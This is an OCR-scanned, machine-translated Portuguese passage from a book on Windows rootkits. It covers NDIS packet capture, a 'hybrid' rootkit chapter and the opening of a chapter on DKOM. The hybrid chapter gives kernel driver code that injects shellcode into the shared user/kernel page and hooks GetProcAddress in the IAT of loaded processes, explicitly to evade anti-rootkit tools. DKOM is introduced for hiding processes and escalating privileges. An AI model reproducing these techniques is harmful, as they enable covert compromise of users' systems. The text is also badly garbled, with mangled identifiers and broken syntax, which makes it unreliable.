NdisAllocateBuffer (SS, SBuffer, Bufferpool, Temp, tamanho) 
; 
if (s == ndis_status_success) 
{ 
Reservado (pacote)-> pbuffer = temp; 
// Anexamos nosso buffer ao pacote 
Ndischainbuffratfront (pacote, buffer); 
// Ligue para Ndistransferdata: 
Ndistransferdata (& (my_struct.status), adapterHandle, 
MacReceiveContext, 0, transferaize, pacote, sbytestransfeed); 
if (my_struct.status! = ndis_status_pending) 
{ 
// sem atraso, precisamos ligar para o ndistransferdatacplet. 
// por conta própria 
Ndistransferdatacompplete (& my_struct, packet, my_struct.status, 
BytestRansfered); 
) 
Return ndis_status_success; 
) 
EXFREEPOOL (Reservado (pacote)-> pheaderbufferp) 
; 
} 
Outro 
( 
Dbgprint ("Erro: alocação de phederbufferp falhou"); 
} 
Exfreepool (temp); 
} 
Return ndis_status_success; 
} 
Agora precisamos refazer uma função 
Ndistransferdatacpletelete 
(Listagem 11.7). 
Listagem 11.7. 
Conclusão da transferência de todo o pacote 
Ndistransferdatacplemplete de vazio ( 
Em ndis_handle protocolbindingconte, 
Em pndis_packet pacote, 
No status ndis_status, 
Em uint bytestransfeed) 
249

pagina: 249

Rootkits 
{ 
Pndis_buffer ndisBuff; 
Buffer pvoid; 
Ulong Bufflen; 
PVOid HeaderBufferp; 
Ulong HeaderBufferlen; 
// Entramos no pacote tcp/ip buffer e no headerbufferp -
Ethernet Heading 
Buffer = reservado (pacote)-> pbuffer; 
Bufflen = bytestransfeed; 
HeaderBufferp = Reservado (pacote)-> pheaderBufferp; 
Headerbufferlen = reservado (pacote)-> pheaderbufferlen; 
If (buffer && 
HeaderBufferp) 
( 
Ulong POS = 0; 
Char *ptr = null; 
Ptr = exallocatepool (sem -Pagedpool, (headerbufferlen + bufflen)); 
If (PTR) 
{ 
Memcpy (PTR, HeaderBufferp, HeaderBufferlen); 
Memcpy (ptr + headerbufferlen, buffer, bufferlen); 
// Temos um pacote inteiro, agora podemos analisá -lo 
// Para isso, transmitimos as funções Parsepacket: 
Parsepacket 
(PTR, (HeaderBufferlen + Bufflen); 
Exfreepool (PTR); 
} 
Exfreepool (buffer); 
Exfreepool (headerbufferp); 
) 
Ndisunchainbuffratfront (pacote, & ndisBuff); 
ifisBuff) 
NdispEbuffer (ndisBuff); 
NdisreinitializePacket (pacote); 
Ndispreepacket (pacote); 
Retornar; 
} 
A tarefa de análise do pacote que colocamos na função Parsepacket,
Twing dois parâmetros: um ponteiro para os dados e o comprimento do buffer de dados.Meu 
A função simplesmente derivará o comprimento, sua tarefa é retirar o conteúdo.Não é 
Difícil, não é? 
Void Parsepacket (Consta Char* Dados, Int Length) 
f 
Char s 
[255]; 
Snprintf (s, 253, "parsepacket: comprimento = %d", comprimento); 
Dbgprint (_s); 
) 
250

pagina: 250

Capítulo 12.
Rutkin híbrido
•
O que é raiz híbrida?
•
Implementação de Rutkin
Rootkits

pagina: 251

12.1.O que é raiz híbrida? 
Como você já sabe, o mais confiável e mais difícil de implementar 
Níveis nucleares de Rutkin.Se tal rutkin for escrito corretamente, determine 
É muito difícil e muitas vezes impossível sem parar o sistema.Eu relembro te 
que a probabilidade de detectar uma raiz em um estado passivo, depois de você
uma chave de computador e conectando seu disco rígido a outro sistema, 
Aumenta bruscamente. 
A rota do nível do usuário é igualmente mais fácil de implementar, 
Quanto mais fácil eles podem ser detectados. 
Neste capítulo, tentaremos escrever um motorista trabalhando como em Paul
o nível de seguro e no nível do núcleo.Este rootkit vai mudar 
Tabelas IAT do processo do usuário, como um usuário regular 
Rutkit, mas ele fará isso sem a abertura do descritor do usuário
Th Processo, Funções do WriteProcessMome, mudanças nas chaves do registro e 
Todos os outros métodos que podem ser facilmente detectados.Para traição
IAT será usado, como você provavelmente já adivinhou, o motorista 
Núcleos.Acontece que nosso Rutkin executará as funções do usuário
rutkita, mas com privilégios de um processo de usuário não -ordens, 
E os drivers do dispositivo em execução no anel zero. 
12.2.Implementação de Rutkin 
Então, vamos começar a escrever uma raiz híbrida.sistema operacional 
fornece -nos uma função muito útil - pssetlmageloadnoti-
Firoutina.Esta função permite que você defina uma função que seja
As crianças são chamadas cada vez ao carregar um programa ou DLL específico. 
252

pagina: 252

Capítulo 12. Rutkin híbrido 
Assim, você pode receber uma notificação sobre quando for lançado 
Os processos que você precisa.PSSETLMAGELOADNOTIFYROTINE FUNÇÕES 
transmitir apenas um parâmetro - o endereço da função que será chamado
derramar sempre que a imagem (DLL ou processo) é carregada no núcleo ou 
Espaço do usuário. 
ntstatus = pssetLoadlMagenotifyRoutine (myCallbackFunction); 
O protótipo da função MyCallbackFunction se parece com o seguinte: 
Void MyCallbackFunction ( 
Em punicode_string, 
Em alça, 
Em pimage_info); 
O primeiro parâmetro é uma linha unicode que contém o nome do módulo.
anseio pelo núcleo.O segundo parâmetro é o processo PID no qual carregamento
Existe um módulo.O terceiro parâmetro é uma estrutura cheia do necessário 
Rutkin com informações (por exemplo, o endereço de memória do módulo carregado). 
Typedef struct _image_info { 
União { 
você
EU.
O
N
G Propriedades; 
Estrutura ( 
Ulong ImageAddressingModule 
: 
8; 
Ulong SystemModelMage 
: 1; 
ULONG IMAGEMAPTTOAUPIDS 
: 
1: 
ULONG RESERVADO 
: 
1; 
}; 
}; 
Pvoid ​​ImageBase; 
Ulong ImagesElector; 
Ulong Imagesize; 
Ulong ImagesectionNumber; 
) Image_info, *pimage_info; 
MyCallback.Function Função é causada ao carregar qualquer 
imagem.Está claro que não estamos interessados ​​em todas as imagens, mas apenas definido
NYE, assim nas funções, você pode filtrar aquelas imagens que 
Você está interessado.O filtro pode ser instalado pelo nome da imagem ou por seu 
PID (para o processo).O filtro está instalado no exemplo a seguir 
Módulo nomeado - Kernel32.dll: 
Void myCallbackFunction (em punicode_string imageName, 
No Handle PID, em Pimage_info imagelnfo); 
{ 
Unicode_string TargetDll; 
Rtllnitunicodestring (& TargetDll, 
L "\\ Windows \\ System32 \\ Kernel32.dll"); 
253

pagina: 253

Rootkits 
if (rtlCompareunicodestring (imageName, stargetdll, true) == 0) 
Hooklat (ImageInfo-> ImageBase, PID); 
} 
A função Hooklat analisa o relé lembrança.Preciso 
Observe que a maioria dos arquivos executáveis ​​do Windows tem um formato 
RE (executável portátil). 
A maioria dos registros de gravação é um inferno virtual relativo
RESA (RVA, endereços virtuais relativos).De fato, esses são deslocamentos da ImageBase 
- Endereços pelos quais a imagem é realmente carregada. 
O relé tem exibições.Primeiro de tudo, você precisa encontrar RVA sob
Seções de importação - image_direct0ry_entry_imp0rt.Colocando este endereço 
Com o endereço do módulo na memória, receberemos um ponteiro para o primeiro descritor 
Image_Import_Descriptor importações. 
Cada DLL, importada como módulo, tem sua própria estrutura
Ra image_lmport_descriptor, consistindo de um indicador para dois diferentes 
variedade.A primeira matriz é uma variedade de endereços de cada 
Da função DLL.Você pode chegar à tabela de endereços usando um membro
Na estrutura do firstrunk image_import_descriptor.O membro é o mesmo 
estruturas 
Originalfirsttrunk serve para procurar uma variedade de decretos
Lei em Image_lmport_by_name Estruturas contendo os nomes de importação
funções dedicadas (exceto para funções importadas pela serial 
número). 
A função Hooklmports verifica todos os módulos: se uma função for encontrada 
GetProcaddress (exportado pela biblioteca kernel32.dll), então 
Altera a proteção da memória da tabela IAT, usando os métodos descritos em 
Parte anterior do livro.Assim que a proteção da memória é removida, o rutkit pode 
Restaure o endereço no endereço do IAT da armadilha. 
Ao desenvolver rotas de usuário, você enfrentará um pequeno 
O problema - o usuário Rutkin precisa ser constantemente distribuído 
Memória dentro do processo remoto, por exemplo, para escrever um casal
Medidores para LOADLIBRARY ou CÓDIGO NOVO.Não, não é difícil.Mas semelhante 
As ações são muito perceptíveis e seu rootkit será muito rapidamente descoberto por anti-
Agentes Rutkutic. 
Rutkin híbrido para esses propósitos usa a memória dividida.Pom
Nita, como fizemos isso no nível do núcleo?Afinal, nosso rutkit é um motorista 
dispositivos, e ele não custa nada para fazê -lo.Nossa tarefa é determinar 
a área de memória do núcleo, exibida no espaço de endereço de cada
o processo do processo e registre seus dados nele. 
254

pagina: 254

Capítulo 12. Rutkin híbrido 
Entre o núcleo e os processos do usuário, um países é separado
Memória do czar (4 kb).No modo núcleo, esta página é projetada no endereço 
Oxffdfoooo e no modo de usuário em 0x7ffe0000.É descrito
A estrutura é kuser_shared_data (definida no arquivo NTDDK. INC). 
Typedef struct _kuser_shared_data { 
TickCountlow volátil Ulong; 
Ulong TickCountMultiplier; 
Interrupção volátil do ksystemjtime; 
Volátil KsystemjTime SystemTime; 
\ 
Volátil Ksystemjtime TimeZoneBias; 
Ushort imagenumberlow; 
Ushort imagenumberhigh; 
Wchar tsystemroot 
[[ 
260 
].; 
Ulong MaxStacktraceThth; 
Ulong criptoxponente; 
Ulong TimeZoneld; 
ULONG RESERVADOR2 [8] 
; 
Nt_productjType ntproductType; 
Boolean ProductTypellValid; 
Ulong Ntmajorversion; 
ULONG NTMINORVERSION; 
BOOLEANES ProcessorFeatures [ProcessorJFeatureJmax]; 
ULONG RESERVADO; 
ULONG RESERVADO3; 
Lip de tempo volátil de ulong; 
Alternativa_architecture_type alternativearchitecture; 
Grande_integer SystemExpirationDate; 
Máscara de along de ULONG; 
Boolean kddebuggenabled; 
ActiveConsoleld volátil Ulong; 
DimountCount volátil Ulong; 
ULONG COMPLUSPACKAGE; 
Ulong LastSystemRiteEntTickCount; 
Ulong NumberOfphysicalPages; 
Boolean SafeBootMode; 
Traceloging Ulong; 
#If definido 
(i386) 
Ulongongo 
Preenchimento; 
Ulongongo 
SystemCall [4]; 
Fendif 
} Kuser_shared_data, *pkuser_shared_data; 
O tamanho da página "total" é de 4 kb, mas como o núcleo usa a parte 
Esta região, nosso Rutkita 3 KB está disponível.Isso é suficiente para 
código e variáveis. 
O componente Rutkin que trabalha no modo núcleo só pode gravar 
No espaço de endereço do núcleo (OxffdFoooo).Para chegar ao processo, 
255

pagina: 255

Rootkits 
Rutkit deve registrar o código de que precisa na região nuclear e depois
Vit O endereço do núcleo no IAT como um endereço de usuário regular. 
Como exemplo, escreveremos nesta área (no programa será 
chamado sharedk) 8 byte: 
Notícias de char não assinadas [] = {{ 
0x90, 
0xb8, oxff, 0x00, oxff, 0x10, 
Oxff, OXEO 
// nop 
// mov eax, oxffoofflo 
// jmp eax 
O primeiro byte é a instrução NOP (operador vazio).Os próximos 5 bai-
- Registrar instruções na EAC de um endereço arbitrário (5 bytes) e os últimos 1 
Bayta é uma transição incondicional para este endereço.No processo de execução de raiz
Keith encontrará uma função no IAT para a qual você precisa instalar uma armadilha e para
Menit este endereço com o endereço da função original.Agora considere a função 
Hooklat do nosso Rutkita "híbrido" (listando 12.1). 
Listagem 
12.1. 
Ntstatus hooklat (pimage_dos_header image_addr, manipulação h_proc) 
// Ponteiro para o cabeçalho do NT 
// Importar descritor 
// rva 
Pimage_dos_header DosHeader; 
Pimage_nt_headers pnth; 
Pimage_import_descriptor IMD; 
Pimage_import_by_name p_ibn; 
DWORD IMPORT_START; 
Pdword pd_iat, pd_into; 
Intsont, índice; 
char *dll_name = null; 
char *p_dll = "kernel32.dll";// ponteiro para a DLL desejada 
Char *p_func = "getProcaddress"; 
Pmdl mdl; 
// região de memória 
Pdword mapedlmtable; 
DWord sharedu = 0x7ffe0800; 
DWord sharedk = 0xffdf0800; 
// Código pequeno que escreveremos no Sharedk 
Notícias de char não assinadas [] = {{ 
0x90, 
// nop 
0xb8, oxff, 0x00, oxff, 0x10, // mov eax, oxffoofflo 
Oxff, Oxeo 
// jmp eax 
// região do usuário 
// região do núcleo 
256

pagina: 256

Capítulo 12. Rutkin híbrido 
}; 
DosHeader = (Pimage_Dos_Header) image_addr; 
Pnth = makeptr (pimage_nt_headers, Dosheader, DosHeader-> e_ 
Ifanew); 
// primeiro verifique se o campo E_LFANW contém o correto 
ponteiro, 
// e depois verifique o re-cabeça 
if (pnth-> assinatura! = image_nt_signature) 
Retornar status_invalid_image_format; 
Import_start = pnth-> opcptionaHeader.datadirectory 
[Image_directory_entry_import] .virtualAddress; 
if (! import_start) retornar status_invalid_image_format; 
IMD = (Pimage_Import_Descriptor) (import_start + ( 
DWord) DosHeader); 
para (contagem = 0; imd [contagem] .Characteristics! = 0; count ++) 
{ 
dll_name = (char*) (imd [contagem] .name + (dword) DosHeader); 
pd_iat = 
(Pdword) 
((DWord) DosHeader) +(DWORD) IMD [contagem]. 
Firsthunk); 
PD_INTO = 
(Pdword) ((dWord) DosHeader) + 
(DWORD) IMD [Count] .originalfirstthunk); 
for (index = 0; pd_iat [index]! = 0; index ++) 
{ 
// Se a função for importada pelo número de série, 
// será instalado bit sênior 
if_into [index] & image_ordinal_flag)! = 
Image_ordinal_flag) 
( 
p_ibn = (pimage_import_by_name) (pd_into [index] + 
((DWord) DosHeader)); 
if ((_stricmp (dll_name, p_dll) == 0) && 
(strcmp (p_ibn-> nome, p_func) == 0)) 
{ 
// dbgprint ("importações de dll: % s", dll_name); 
// dbgprint ("Nome: %s endereço: %x \ n", 
p_ibn-> nome, pd_iat [index]); 
Mdl = mmcreatemdl (null, & pd_iat [index], 4); 
if (! mdl) retornar status_unsuccessful; 
MMbuildMdlForNonPagedpool (MDL); 
// Altere as bandeiras da região 
mdl-> mdlflags = 
mdl-> mdlflags i mdl_mapp_to_system_va; 
MapeDlmTable = 
MmmmaplockedPages (mdl, kernelmode); 
se (! is_hooked) 
{ 
// Registre o novo código na área do Sharedk. 
9 s
A
A 6
6
5 
257

pagina: 257

Rootkits 
// Tamanho do código - 8 bytes 
Rtlcopymemory ((pvoid) sharedk, 
Novo Código, 
8); 
Rtlcopymememory ((pvoid) (sharedk+2), 
(Pvoid) & pd_iat [index], 
4); 
Is_hooked = true; 
) 
// Deslocamento da nova "função" 
*Mapedimtable = compartilhado; 
// MDL grátis 
MmonmaplockedPages (mapedlmtable, mdl); 
Iofreemdl (mdl); 
} // se 
} // se 
} // para 
} // para 
Retornar status_success; 
} 
258

pagina: 258

Capítulo 13. Tecnologia DKOM 
• 
Vantagens e desvantagens dkom 
• 
Determinação da versão do Windows 
• 
Interação do motorista 
Dispositivos e usuário 
Processo 
• 
Ocultando processos usando 
Dkom 
• 
Drivers de conexão de dispositivos 
• 
Problemas de sincronização 
• 
Obtendo adicional 
Privilégios 
Rootkits

pagina: 259

Nos capítulos anteriores deste livro, examinamos os muito eficazes
Nicky: interceptação de desafios sistêmicos e substituição do caminho de execução.Doença
Mas, essas tecnologias funcionam.Mas eles têm uma desvantagem comum - eles 
relativamente facilmente detectado.Administrador qualificado 
pode detectar rapidamente a presença de rootkit no sistema - ele 
Você apenas precisa saber onde procurar. 
Neste capítulo, falaremos sobre outra técnica - Dkom.DKOM (kernel direto 
Manipulação de objetos) é uma manipulação direta dos objetos do núcleo. 
Não há necessidade de confundir essa tecnologia com o DCOM - estes são dois completamente diferentes 
coisas.A palavra "objeto" no nome DKOM deve ser entendida como "estrutura". 
Neste capítulo, falaremos sobre manipulações com as estruturas do núcleo.Prazo 
O "objeto" criou a Microsoft.Às vezes vamos usá -lo, e 
Às vezes - não. 
O DKOM permite manipular vários objetos de núcleos que POS
Flui para ocultar arquivos e processos sem modificar o caminho de execução 
E instalações de armadilhas.Dkom é detectado muito mais complicado do que 
Os dois métodos anteriores. 
Também neste capítulo, falaremos sobre a obtenção de um processo de usuário 
privilégios de administrador.Mas antes de começar prático 
lado da questão, devemos falar sobre as vantagens e desvantagens 
Dkom.Afinal, qualquer tecnologia tem seus pontos fortes e fracos. 
13.1.Vantagens DKOM Desvantagens 
Vamos começar com as vantagens.A principal vantagem do dkom é 
Que Rutkit trabalha com as estruturas do núcleo através dos objetos dos objetos 
260

pagina: 260

Capítulo 13. Tecnologia DKOM 
(Gerenciador de objetos), que implica acesso completo às estruturas do núcleo 
- Sua criação, exclusão, leitura, gravação e proteção.Você não está mudando o caminho 
execuções e não interceptam chamadas do sistema, mas simplesmente modificadas
Apresse a estrutura do núcleo e você faz isso em nome do despachante de objeto. 
É muito difícil detectar essa modificação.Este é o principal pré
Propriedade DKOM. 
Muitas vezes acontece que as vantagens também são uma falta
mi.Por exemplo, o sistema mais protegido é muitas vezes complicado
Noé.Um erro de administrador - e todos os esforços dos desenvolvedores do sistema 
será reduzido a nada.A mesma situação se desenvolveu em torno de DKOM.Um 
Um erro da sua parte - e o sistema será destruído.Afinal, você precisa 
Modificou o Santo dos Santos - as estruturas do núcleo.Para escrever 
O programador Dkom-Rutkitov deve entender as seguintes coisas: 
• 
O que isso ou esse objeto faz?Quais papéis os membros do volume
EXTEXT?A estrutura do núcleo é pouco documentada, às vezes é necessário 
Aja pelo método "Poke Scientific". 
• 
Como isso ou esse objeto usa o núcleo?Sem entender, como 
Por que o núcleo usa o objeto, você não pode fazê -lo corretamente
encaixa. 
• 
O objeto pode variar dependendo da versão do Windows, mesmo 
a presença de um pacote de serviço específico.Por exemplo, seu objeto pode 
Seja o mesmo em todas as versões do Windows, ou talvez diferente 
No Windows 2000 e Windows XP, e talvez até no Windows XP SP2. 
Se você quiser escrever um rootkit universal, você deve "em
Para ensinar "para determinar a versão do Windows, bem como agir em dependente
Assinção do Windows. 
• 
Quando o objeto é usado?Algumas áreas de memória e 
Além disso, as funções não estão disponíveis em vários níveis de IRQL (interrupção 
Nível de solicitação).Por exemplo, no nível de despacho_level_irql você em
Você não pode trabalhar com memória, caso contrário, você terá uma falha na página 
No núcleo. 
Acontece que antes de modificar um objeto específico do núcleo, 
O programador deve realizar um estudo real - para se aprofundar 
núcleo pelo depurador, descobrindo os detalhes do dispositivo e funcionando 
este objeto. 
O melhor depurador do nível do núcleo hoje é Numega 
Softlce.Os membros da estrutura do núcleo também podem ser removidos usando o programa
Somos Windbg, disponível em http://www.microsoft.com/whdc/ 
Devtools/DDK/Def Ault .mspx (Fig. 13.1). 
261

pagina: 261

Rootkits 
Arroz.13.1.Depurador Windbg em ação 
Para retirar os membros de qualquer estrutura, digite o comando p1;! _ Nome_ 
objeto.Por exemplo, neste capítulo, vamos considerar a estrutura 
Eprocess, descrevendo os parâmetros do processo.Para retirar os membros disso 
Estruturas, digite o comando nt! _Eprocess. 
Outra desvantagem do dkom-rutkita é devido ao máximo 
A tecnologia limita sua funcionalidade.Desde esse rutkin 
trabalhar através do despachante de objetos, eles só podem manipular 
Os objetos que o despachante de objeto pode manipular. 
Por exemplo, o sistema armazena uma lista de processos na memória.Despachante de objetos 
Ele pode alterar esta lista - portanto, o Rutkit pode alterá -lo. 
Mas o sistema não armazena na memória a lista de absolutamente todos os arquivos de arquivo 
Sistemas, portanto, o dkom-rutkit não pode ocultar arquivos e kata
Histórico.Em geral, o dkom-rutkita pode executar o seguinte 
ações: 
• 
ocultar processos; 
• 
ocultar drivers de dispositivos; 
• 
ocultar as portas; 
262

pagina: 262

Capítulo 13. Tecnologia DKOM 
• 
alterar o nível de privilégio dos processos executados; 
• 
Vá por torno de programas de exame forense. 
Agora que você sabe mais sobre Dkom-Rutkita, vamos praticar. 
13.2.Determinação da versão do Windows 
Como já observado, para Dkom-ratkita, é vital corretamente 
Determine a versão do Windows.Isso pode ser feito de várias maneiras, sobre 
que vamos conversar agora. 
13.2.1.Função da API getVersion 
É muito fácil determinar a versão do Windows usando a função da API 
GetVersionEx.A maneira mais fácil é demonstrar o trabalho desta função em 
O próximo exemplo (listando 13.1). 
Listagem 13.1.Determinação da versão do Windows no modo de usuário 
Void PrintWindsversion () 
f 
OsversionInfoex 
OSV; 
// Não se esqueça de definir o tamanho da estrutura, 
// Caso contrário, teremos o resultado errado 
osv.dwosversionlnfosize = 
Sizeof (OsversionInfoEx); 
if (getversionEx ((OsversionInfo *) sosv)) 
{ 
run.dwplatformld == 
Ver plataforma win32 nt 
// Windows NT, 
2000, xp, 
2003 
If (osv.dwmajorverversion == 4 && osv.dwminorversion 
Printf ("Win NT 4.0") 
; 
if (osv.dwmajorversion == 
5) 
Switch (OSV.DWMinorverSion) 
== 0) 
{ 
Caso 0: { 
Printf ("Windows 2000");Quebrar; 
Caso 1: 
{ 
Printf ("Windows 
Xp "); 
se 
2) 
Printf 
(
"SP2"); 
Quebrar; 
Caso 2: { 
Printf ("Windows 2003");Quebrar;} 
263

pagina: 263

Rootkits
} / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / /
Trocar
} / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / / /
Se
Outro
(
/ / Windows 9x
if (osv.dwmajorversion == 4)
Switch (OSV.DWMinorverSion)
{
Caso 0: {
Printf
("Janelas
9
5
'
'
Caso 10: {
Printf ("Windows 98 '
Caso 90: {
Printf
("Janelas
Meu ''
} // Trocar
} // Outro
Quebrar;}
Quebrar;}
Quebrar;}
} se
Você pode modificar facilmente esta função se souber
O valor dos membros da estrutura de OsversionInfoex:
Typedef struct _osversionInfoex {
DWord dwosversionlnfosize
DWord dwmajorversion;
DWord dwMinorverSion;
DWord dwbuildNumber;
DWord dwplatformld;
Tchar szcsdversion [128]
;
Palavra wservicepackmajor;
Palavra wServicePackMinor;
Palavra wsuitemask;
Byte wproductype;
Byte WRREAVERIDO;
:
// O tamanho da estrutura
// a versão principal do sistema operacional
// versão adicional
// build-nomer (número de montagem)
// Plataformas de identificação
// o nome do pacote de serviço, por exemplo,
// pacote de serviço l
// A versão principal da versão de serviço do serviço
// adicional.Número da versão do pacote de serviço
// tipo de produto
// reservado
OsversionInfoEx, *posversionInfoEx, *lposversionInfoEx;
13.2.2.Funções do modo núcleo
A função getVersionEx está longe de ser a única maneira de determinar
Versões do Windows.Existem funções de um propósito semelhante no núcleo.EM
As versões mais antigas do Windows usam a função PSGetVersion,
Retornando a versão principal e adicional do Windows, coleção de números
ki (nômer de construção), bem como string de unicode contendo informações sobre
Pacote de serviço.O protótipo desta função é o seguinte:
Psgetversion booleano (Pulong majorversion opcional,
Pulong Minorversion Opcional,
Pulong BuildNumber Opcional,
264

pagina: 264

Capítulo 13. Tecnologia DKOM 
Punicode_string csdversion opcional 
); 
Em versões mais recentes do Windows (XP, 2003), a função da API está disponível 
RtlgetVersion.Ela precisa transferir o ponteiro para a estrutura dosver
Sioninfow ou osversionInfoExw (essas estruturas são semelhantes à estrutura 
OsversionInfoex).O protótipo da função é o seguinte: 
Ntstatus rtlgetversion (em out rtl_osversionfowowlpversion-
para r m a t i o n); 
13.2.3.Registro do sistema 
Há outra maneira de determinar a versão do Windows: ele entende
Xia, registrado no registro, de onde é muito fácil extrair as informações desejadas 
(Fig. 13.2, na figura eu limpei o número da minha versão de licença do Windows). 
|Editor de registro 
5> EDITAR 
Visualizar.Th? 
^Edição 
• 
|TelnetServer 
S.
Custor do servidor de terminal 3 C J 
Si £ J rasting 
S CJ Transaction Server 
>, Cj t atirar 
º
9 _J Espaços de ajuste 
• Host do dispositivo J _ l UPNP 
. 
Sh-sz visyal jsharp 
* - J Visual JSharp Setup 
• _J VisualStudio 
•;_ J vsa 
•!_ J era 
1 
>;J. 
W8EM 
$ £) pastas da web 
você 
Provedores de serviços da web 
U. • _) Windows 
Sh *'_ J Wmdows Media Device Manager 
F sobre 
Subsistema de mensagens WMDOWS 
- '_J Wmdows nt 
3 '23 CurrentVersion 
ft) q J adesão 
você 
CJ Aedebug 
Sqaw 
P 
Aulas 
: Q J Compatiboly 
;£ 3 compatibiity32 
SH CJ Console 
J f J DebugobjectPcenabled 
Não. 
.: •. 
': 
. 
. 
• 
- \. 
; 
-: 
-
~ 3 
• R1 
^icroso 
Nome 
• 
£ 3 (por padrão) 
@| 
Shshshzha 
Q o j "e n t 8 u" 
Sjcurrentbumnumber 
Qcuwenttype 
L ™ J CurrentVersion 
§ | 
[S^instalar 
L "£ JCenseinfo 
Sjpathname 
2J] ProductCid 
L^Productnarne 
^Regdone 
C*0RegisterDorgani2ation 
L^RegisterDownet 
C ** JSOFTWARETYPE 
Sjsourcepath 
£*| 
Slsystemroot 
<\ 
. 
.. 
-
T \ WRTDOV*S NT \ CurrentVersion 
, ': • 
AJW. 
:.,: ..... 
Reg.sz 
Reg.sz 
Reg.sz 
Reg.sz 
Reg.sz 
Reg.sz 
Reg.sz 
Re5.binarv 
Reg.dword 
Reg.8inarv 
Reg.sz 
Reg.sz 
Reg.sz 
Reg.sz 
Reg.sz 
Reg.sz 
Reg.sz 
Reg.sz 
Reg.sz 
Reg.sz 
:;: 
. =! 
J Significado 
(o valor não é atribuído) 
2600.xpspl.020928-1920 
Pacote de serviço 1 
1.511.1 0 (dados obsoletos - não use 
2600 
Uniprocessor grátis 
5.1 
Em "o o • un 00 v e z g e: • 
O <-t30mcf (pa m a g a) 
M 6 m 3 
“• • • A D H 2 6 H B D F 3 
C: \ wln0es 
Microsoft Windows XP 
Home Ltd 
Denis 
Sistema 
G: \ i386 
a 
C: \ wwdows 
1 
E 
4 
Arroz.13.2.Chaves de registro relacionadas à versão 
janelas 
As seguintes chaves do registro são interessantes para nós: 
• 
H K L M \ S O F T W A R E \ M I C R O F T \ W I N D O W S W S R E N T V E R S I O N \ 
CurrentVersion - contém as versões principais e adicionais 
Janelas, separadas por um ponto; 
265

pagina: 265

Rootkits 
• 
HKLM \ Software \ Microsoft \ Windows \ CurrentVersion \ CSDVersion 
-Tida a linha que descreve o pacote de serviços; 
• 
H K L M \ S O F T W A R E \ M I C R O F T \ W I N D O W S W S R E N T V E R S I O N \ 
CurrentBuildNumber - contém o número da montagem. 
Trabalhando no nível do usuário, você pode ler os valores destes 
Chaves usando funções RegQueryValue ou RegQueryValuex.Sobre 
O nível do núcleo deve ser agido de maneira diferente.Próximo código (Listagem 13.2) 
Permite descobrir a versão do sistema operacional do registro, trabalhando no nível do núcleo. 
Listagem 13.2.Apelar para o registro no nível do núcleo 
Rtl_query_registry_table params [3]; 
CSD unicodestor; 
Versão unicodestring; 
Rtlzeromemery (params, sizeof 
(params)); 
Rtlzeromemery (sversion, sizeof (versão)); 
Rtlzeromemery 
(& Csd, sizeof (CSD)); 
Params [0] .flags = rtl_query_registry_direct; 
Params [0] .Name = L "CurrentVersion"; 
Params [0] .EntryContext = sversion; 
Params [0] .DefaultType = reg_sz; 
Params [0] .DefaultData = Serversion; 
Params [0].DefaultLength = sizeof 
(Versão); 
Params [1] .flags = rtl_query_registry_direct; 
Params [1] .name = l "csdversion"; 
Params [1] .EntryContext = scsd; 
Params [1] .DefaultType = reg_sz; 
Params [1] .DefaultData = Sversion; 
Params [1].DefaultLength = sizeof (CSD); 
RtlQueryRegistryValues ​​(rtl_registry_windows_nt, null, 
Params, nulo, nulo); 
// Depois de chamar a função rtlQuerReGistryValues, podemos trabalhar 
// com os valores recebidos 
// livre A memória alocada para unicode string: 
Rtlfreunicodestring (Sversion); 
Rtlfreeunicodestring (& csd); 
13.3.Interação do driver do dispositivo e 
Processo do usuário 
Já consideramos a interação do processo do usuário e as unidades
A crença do dispositivo, mas no caso de Dkom-Rutkit, a situação é um pouco diferente. 
266

pagina: 266

Capítulo 13. Tecnologia DKOM 
Se você precisar transferir dados ou controlar informações de Paul
O processo de convite, você deve usar o IOCTL - Control 
Códigos de entrada/saída.Esses códigos de controle são transferidos para pacotes IRP. 
É claro que os aplicativos de driver e usuário devem usar 
Os mesmos códigos de controle, ou seja, você deve concordar com isso.Geralmente 
É mais fácil determinar os códigos usados ​​no arquivo de cabeçalho incluído 
Para o código do aplicativo de usuário e Rutkin.Do utilizador 
O processo se volta para o motorista, causando a função do deviceLocontrol, 
que precisa ser transmitido pelo descritor do driver e pelo código OCTL. 
Determine o código de controle: ioctl_drv_init para inicialização 
Dispositivos e i0ctl_drv_ver para receber uma versão do driver.Cabeçalho
O arquivo é chamado my_ioctl.h.Para trabalhar com o IOCTL, você precisa se conectar
Chef este arquivo após o arquivo winioctl.H: 
• 
Definir file_dev_drv 0x00002a7b 
// O IOCTL seguinte deve ser acordado entre o usuário 
aplicativo 
// e driver 
#definir 
Ioctl_drv_init 
(ULONG) CTL_CODE (FILE_DEV_DRV, 
0 x 0 1, 
\ 
Method_buffhed, 
File_write_access) 
#definir 
Ioctl_drv_ver 
(ULONG) CTL_CODE (FILE_DEV_DRV, 
0 x 0 2, 
\ 
Method_buffhed, 
File_write_access) 
• Definir 
I o c t l _ t r a n s f e r _ t y p e (_ i o c o n t r o l) (_ i o c o n t r o l 
& 0x3) 
Ambos os IOCTL usam o buffer do método de entrada/saída 
Method_buffhed.Isso significa que o despachante de entrada/saída será cópias
Rive dados de uma pilha de usuários para o núcleo do núcleo. 
Listagem 13.3 mostra um fragmento do código da parte do usuário da raiz, 
Inicializando o componente do nível do núcleo (driver). 
Listagem 13.3.Transfira para o driver de código do IOCTL 
• Inclua <windows.h> 
• Inclua <stdio.h> 
• Incluir <String.h> 
• Incluir <Winioctl.h> 
• Inclua <my_ioctl.h> 
Void Main (vazio) 
// anúncio de variáveis ​​... 
Lidar com HDevice; 
Hdevice = createfile (completEdEviceName, 
Geneeric_read | 
Geneeric_write, 0, null, open_existing, 
Atributo de arquivo normal, nulo); 
267

pagina: 267

Rootkits 
Se 
(H d e v i c e == 
((Alça) -1)) 
{ 
Printf ("Não é possível abrir o dispositivo %s \ n", concluir o nome do nome); 
Saída 
(1); 
} 
if (idevicelocontrol (hdevice, ioctl_drv_init, null, 0, 
0, null, & bytes_read, null)) 
{ 
Printf 
("Não é possível inicializar o driver \ n"); 
Saída 
(1); 
Função do motorista - o ponto de entrada do driver - deve: 
• 
Crie um objeto do dispositivo com o nome especificado; 
• 
criar um link simbólico para o dispositivo; 
• 
Preencha a tabela principal de função com indicadores de função -
Processadores de vários tipos de IRP. 
Todos esses pontos foram discutidos em detalhes no capítulo 5, então não nos tornaremos 
repita.A cláusula 5.6 mostra o código da função DriverEntry, que registra 
IRP TIPO IRP_MJ_DEVICE_C0NTR0L TIPO IRP.Teremos esta função 
